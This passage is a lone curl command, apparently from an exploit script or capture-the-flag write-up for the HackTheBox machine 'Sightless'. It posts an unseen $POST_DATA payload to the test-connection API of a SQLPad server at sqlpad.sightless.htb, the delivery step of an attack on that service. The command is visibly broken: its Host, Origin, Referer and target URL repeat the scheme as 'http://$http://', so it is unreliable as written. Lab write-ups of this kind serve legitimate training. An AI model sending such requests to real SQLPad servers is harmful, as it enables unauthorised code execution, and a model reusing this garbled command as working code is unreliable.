...
curl -i -s -k -X POST -H "Host: $http://sqlpad.sightless.htb" -H "Accept: application/json" -H "Content-Type: application/json" -H "Origin: http://$http://sqlpad.sightless.htb" -H "Referer: http://$http://sqlpad.sightless.htb/queries/new" -H "Connection: keep-alive" --data-binary "$POST_DATA" "http://$http://sqlpad.sightless.htb/api/test-connection" > /dev/null
